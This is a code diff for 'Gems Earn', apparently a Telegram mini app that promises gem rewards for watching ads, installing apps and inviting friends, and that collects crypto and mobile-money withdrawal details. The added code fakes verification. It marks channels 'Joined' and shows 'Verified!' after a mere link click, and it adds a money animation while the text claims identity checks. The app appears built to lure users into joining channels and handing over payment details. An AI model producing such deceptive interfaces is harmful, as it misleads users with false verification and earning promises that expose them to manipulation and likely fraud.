@@ -6,30 +6,33 @@
     <title>Gems Earn App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg-color: #181820; --card-bg: #23232f; --primary-red: #f23b5d; --text-light: #ffffff; --text-muted: #8b8b9e; --green: #2ecc71; --border-color: #323242; }
+        :root { --bg-color: #181820; --card-bg: #23232f; --primary-red: #f23b5d; --text-light: #ffffff; --text-muted: #8b8b9e; --green: #2ecc71; --border-color: #323242; --gold: #f1c40f;}
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: var(--bg-color); color: var(--text-light); padding-bottom: 80px; overflow-x: hidden; }
         
         /* --- Animations --- */
         @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(242, 59, 93, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(242, 59, 93, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(242, 59, 93, 0); } }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes glow { from { box-shadow: 0 0 5px var(--green); } to { box-shadow: 0 0 20px var(--green); } }
+        
+        /* Money Animation */
+        .money-particle { position: fixed; font-size: 30px; animation: floatUp 1s ease-out forwards; z-index: 9999; pointer-events: none;}
+        @keyframes floatUp { 0% { opacity: 1; transform: translateY(0) scale(1); } 100% { opacity: 0; transform: translateY(-150px) scale(1.5); } }
 
         /* Lock Screen */
         #lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-color); z-index: 1000; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-y: auto; }
         .lock-icon-container { width: 80px; height: 80px; background: rgba(242, 59, 93, 0.1); border-radius: 20px; display: flex; justify-content: center; align-items: center; margin-top: 40px; margin-bottom: 20px; border: 1px solid rgba(242, 59, 93, 0.3); animation: pulse 2s infinite; }
         .lock-icon-container svg { width: 40px; fill: var(--primary-red); }
-        .lock-title { font-size: 28px; font-weight: bold; margin-bottom: 10px; animation: slideUp 0.5s ease-out; }
-        .lock-desc { color: var(--text-muted); text-align: center; margin-bottom: 30px; font-size: 14px; animation: slideUp 0.6s ease-out; }
+        .lock-title { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
+        .lock-desc { color: var(--text-muted); text-align: center; margin-bottom: 30px; font-size: 14px; }
         
-        .join-btn { width: 100%; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; color: var(--text-light); text-decoration: none; transition: 0.3s; animation: slideUp 0.7s ease-out;}
-        .join-btn:active { background: #2a2a38; transform: scale(0.98); }
+        .join-btn { width: 100%; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; color: var(--text-light); text-decoration: none; transition: 0.3s;}
+        .join-btn.active { border-color: var(--green); }
         .join-btn-left { display: flex; align-items: center; gap: 10px; font-weight: bold; font-size: 14px;}
         .join-icon { width: 24px; height: 24px; background: #3b3b4d; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 12px;}
-        .join-action { color: var(--green); font-size: 12px; font-weight: bold; background: rgba(46, 204, 113, 0.1); padding: 6px 10px; border-radius: 6px; animation: glow 1.5s infinite alternate;}
+        .join-action { color: var(--green); font-size: 12px; font-weight: bold; background: rgba(46, 204, 113, 0.1); padding: 6px 10px; border-radius: 6px;}
         
-        .main-btn { width: 100%; background: var(--primary-red); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; animation: slideUp 0.8s ease-out; transition: 0.2s;}
-        .main-btn:active { transform: scale(0.95); }
+        .main-btn { width: 100%; background: var(--primary-red); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; opacity: 0.5; pointer-events: none; transition: 0.3s;}
+        .main-btn.ready { opacity: 1; pointer-events: auto; animation: pulse 2s infinite;}
         
         /* Math Modal */
         #math-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; justify-content: center; align-items: center; }
@@ -60,7 +63,7 @@
         .action-card { background: var(--card-bg); border-radius: 15px; padding: 18px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; border: 1px solid var(--border-color); border-left: 3px solid var(--primary-red); transition: 0.2s; }
         .action-card:active { transform: scale(0.98); }
         .action-card.green-border { border-left-color: var(--green); }
-        .action-card.yellow-border { border-left-color: #f1c40f; }
+        .action-card.yellow-border { border-left-color: var(--gold); }
         .action-card-info h3 { font-size: 16px; margin-bottom: 4px; }
         .action-card-info p { font-size: 12px; color: var(--text-muted); }
         .btn-small { background: transparent; color: var(--green); border: none; font-weight: bold; font-size: 12px; cursor: pointer; text-decoration: none;}
@@ -72,7 +75,7 @@
         .task-card-header h3 { font-size: 18px; }
         .badge { background: rgba(242, 59, 93, 0.1); color: var(--primary-red); font-size: 12px; padding: 4px 8px; border-radius: 8px; }
         .task-desc { font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 20px; }
-        .task-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: var(--primary-red); color: white; transition: 0.2s;}
+        .task-btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; font-size: 16px; cursor: pointer; background: var(--primary-red); color: white; transition: 0.2s; overflow: hidden; position: relative;}
         .task-btn:active { transform: scale(0.95); }
 
         .invite-box { background: #14141a; border: 1px solid var(--border-color); border-radius: 15px; padding: 15px; display: flex; justify-content: space-between; align-items: center; margin: 20px 0; }
@@ -105,32 +108,37 @@
 </head>
 <body>
 
+    <!-- Lock Screen -->
     <div id="lock-screen">
         <div class="lock-icon-container"><svg viewBox="0 0 24 24"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm3 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/></svg></div>
         <h1 class="lock-title">Access Required</h1>
-        <p class="lock-desc">Join our official channels to verify your identity and unlock the application.</p>
+        <p class="lock-desc">Join all official channels to verify and unlock the app.</p>
         
-        <a href="https://t.me/ych90b" target="_blank" class="join-btn">
-            <div class="join-btn-left"><div class="join-icon">✈️</div> Official Channel 1</div><div class="join-action">Join ➔</div>
+        <!-- Channel 1 -->
+        <a href="https://t.me/ych90b" target="_blank" class="join-btn" onclick="markJoined(this)">
+            <div class="join-btn-left"><div class="join-icon">✈️</div> Official Channel 1</div>
+            <div class="join-action">Join ➔</div>
         </a>
-        <a href="https://t.me/H8TUNNEL" target="_blank" class="join-btn">
-            <div class="join-btn-left"><div class="join-icon">✈️</div> Official Channel 2</div><div class="join-action">Join ➔</div>
+        <!-- Channel 2 -->
+        <a href="https://t.me/H8TUNNEL" target="_blank" class="join-btn" onclick="markJoined(this)">
+            <div class="join-btn-left"><div class="join-icon">✈️</div> Official Channel 2</div>
+            <div class="join-action">Join ➔</div>
         </a>
-        <a href="https://t.me/hdj002c" target="_blank" class="join-btn">
-            <div class="join-btn-left"><div class="join-icon">✈️</div> Payout Proofs</div><div class="join-action">Join ➔</div>
-        </a>
-        <a href="https://t.me/hdj002c" target="_blank" class="join-btn">
-            <div class="join-btn-left"><div class="join-icon">✈️</div> Bonus Channel</div><div class="join-action">Join ➔</div>
+        <!-- Channel 3 -->
+        <a href="https://t.me/hdj002c" target="_blank" class="join-btn" onclick="markJoined(this)">
+            <div class="join-btn-left"><div class="join-icon">✈️</div> Payout Proofs</div>
+            <div class="join-action">Join ➔</div>
         </a>
         
-        <button class="main-btn" onclick="openMathModal()">Verify & Continue</button>
+        <button class="main-btn" id="verifyBtn" onclick="openMathModal()">Verify & Continue</button>
     </div>
 
+    <!-- Math Modal -->
     <div id="math-modal">
         <div class="modal-content">
             <div class="robot-icon">🤖</div>
             <h2>Human Check</h2>
-            <p style="font-size: 12px; color: var(--text-muted); margin-top: 10px;">For security reasons, please calculate the sum below.</p>
+            <p style="font-size: 12px; color: var(--text-muted); margin-top: 10px;">Calculate the sum below.</p>
             <div class="math-box" id="math-question">6 + 1 = ?</div>
             <input type="number" id="math-input" placeholder="Enter answer here...">
             <div class="modal-actions">
@@ -140,6 +148,7 @@
         </div>
     </div>
 
+    <!-- Main App -->
     <div id="main-app">
         <div class="header">
             <div>💎 Gems Earn</div>
@@ -157,20 +166,21 @@
             </div>
             <div class="action-card green-border"><div class="action-card-info"><h3>Public Payout Channel</h3><p>See live withdrawal proofs 💸</p></div><a href="https://t.me/hdj002c" target="_blank" class="btn-small">JOIN ➔</a></div>
             <div class="action-card"><div class="action-card-info"><h3>Increase Instagram Followers</h3><p>Likes, Views, etc... 🚀</p></div><button class="btn-small red">OPEN ➔</button></div>
-            <div class="action-card yellow-border"><div class="action-card-info"><h3>Earning Leaderboard</h3><p>Top 10 Earners 🏆</p></div><button class="btn-small" style="color: #f1c40f;">VIEW ➔</button></div>
         </div>
 
         <div id="page-earn" class="page">
             <div class="task-title"><span>Premium Ads</span><span>🕒 Daily Reset</span></div>
+            
             <div class="task-card-large">
                 <div class="task-card-header"><h3>▶️ Watch & Earn</h3><span class="badge">0/10 Today</span></div>
                 <p class="task-desc">Watch advertisements securely to earn <strong>50 Gems</strong> instantly.</p>
-                <button class="task-btn" onclick="triggerTask('Watch & Earn')">Verify to Start</button>
+                <button class="task-btn" onclick="triggerTask('Watch & Earn', event)">Verify to Start</button>
             </div>
+            
             <div class="task-card-large">
                 <div class="task-card-header"><h3>🔥 High Reward Task</h3><span class="badge">+1000 💎</span></div>
                 <p class="task-desc">Download App, create new account and earn 1000 Gems instantly!</p>
-                <button class="task-btn" onclick="triggerTask('High Reward Task')">OPEN TASK</button>
+                <button class="task-btn" onclick="triggerTask('High Reward Task', event)">OPEN TASK</button>
             </div>
         </div>
 
@@ -182,7 +192,7 @@
                 <div class="invite-link" id="ref-link">https://t.me/YourBot?start=...</div>
                 <button class="copy-btn" onclick="copyLink()">📋</button>
             </div>
-            <button class="main-btn" style="margin-top: 0;">🔗 Share Link to Friends</button>
+            <button class="main-btn" style="margin-top: 0; opacity: 1; pointer-events: auto;">🔗 Share Link</button>
         </div>
 
         <div id="page-wallet" class="page">
@@ -196,7 +206,6 @@
                 </div>
             </div>
 
-            <!-- Payment Methods Selection -->
             <div class="payment-methods">
                 <div class="pay-method active" onclick="selectMethod('USDT', this)">USDT (BEP20)</div>
                 <div class="pay-method" onclick="selectMethod('Binance', this)">Binance ID</div>
@@ -226,18 +235,57 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        let joinedCount = 0;
+
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
             document.getElementById('user-id-display').innerText = tg.initDataUnsafe.user.id;
             document.getElementById('ref-link').innerText = "https://t.me/YourBot?start=" + tg.initDataUnsafe.user.id;
         }
 
-        // --- Random Math Generator ---
+        // --- Channel Logic ---
+        function markJoined(element) {
+            if(!element.classList.contains('active')){
+                element.classList.add('active');
+                element.querySelector('.join-action').innerText = "Joined ✔️";
+                element.querySelector('.join-action').style.color = "var(--green)";
+                joinedCount++;
+            }
+            if(joinedCount >= 3) {
+                const btn = document.getElementById('verifyBtn');
+                btn.classList.add('ready');
+                btn.innerText = "Verified! Click to Continue";
+            }
+        }
+
+        // --- Money Animation Logic ---
+        function createMoneyAnimation(e) {
+            let x = e.clientX || window.innerWidth / 2;
+            let y = e.clientY || window.innerHeight / 2;
+            
+            for(let i=0; i<8; i++) {
+                let particle = document.createElement('div');
+                particle.classList.add('money-particle');
+                particle.innerText = '💵'; // Money emoji
+                
+                // Randomize start position slightly around the click
+                let offsetX = (Math.random() - 0.5) * 100;
+                let offsetY = (Math.random() - 0.5) * 50;
+                
+                particle.style.left = (x + offsetX) + 'px';
+                particle.style.top = (y + offsetY) + 'px';
+                document.body.appendChild(particle);
+                
+                // Remove element after animation ends
+                setTimeout(() => { particle.remove(); }, 1000);
+            }
+        }
+
+        // --- Math Generator ---
         let currentAnswer = 0;
         function openMathModal() { 
             const num1 = Math.floor(Math.random() * 9) + 1;
             const num2 = Math.floor(Math.random() * 9) + 1;
             currentAnswer = num1 + num2;
-            
             document.getElementById('math-question').innerText = num1 + " + " + num2 + " = ?";
             document.getElementById('math-input').value = '';
             document.getElementById('math-modal').style.display = 'flex'; 
@@ -269,33 +317,38 @@
         function selectMethod(method, element) {
             document.querySelectorAll('.pay-method').forEach(el => el.classList.remove('active'));
             element.classList.add('active');
-            
             const label = document.getElementById('wallet-label');
             const input = document.getElementById('wallet-address');
-            
             if(method === 'USDT') {
-                label.innerText = "1. Enter USDT (BEP20) Address";
-                input.placeholder = "0x...";
+                label.innerText = "1. Enter USDT (BEP20) Address"; input.placeholder = "0x...";
             } else if(method === 'Binance') {
-                label.innerText = "1. Enter Binance Pay ID";
-                input.placeholder = "e.g. 123456789";
+                label.innerText = "1. Enter Binance Pay ID"; input.placeholder = "e.g. 123456789";
             } else if(method === 'Telebirr') {
-                label.innerText = "1. Enter Telebirr/Ebirr Number";
-                input.placeholder = "e.g. 0912345678";
+                label.innerText = "1. Enter Telebirr/Ebirr Number"; input.placeholder = "e.g. 0912345678";
             }
         }
 
         function copyLink() { navigator.clipboard.writeText(document.getElementById('ref-link').innerText); showToast("Link Copied!"); }
         
-        function triggerTask(taskName) {
+        // --- Task Trigger with Animation & Ban Check ---
+        function triggerTask(taskName, event) {
             if (!tg.initDataUnsafe.user) return alert("Please open inside Telegram");
             
-            // ዳታውን ወደ Python ሰርቨር መላክ
+            // Play Animation
+            createMoneyAnimation(event);
+
+            // Send to Backend
             fetch('/api/complete_task', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ task_name: taskName, user_id: tg.initDataUnsafe.user.id, username: tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name })
-            }).then(res => res.json()).then(data => { if(data.status === "success") showToast("✅ Sent to Admin!"); })
-              .catch(err => showToast("❌ Error connecting"));
+            }).then(res => res.json()).then(data => { 
+                if(data.status === "success") {
+                    showToast("✅ Sent to Admin!");
+                } else if(data.status === "banned") {
+                    alert("🚫 You have been banned for using multiple accounts!");
+                    tg.close();
+                }
+            }).catch(err => showToast("❌ Error connecting"));
         }
         
         function showToast(msg) {
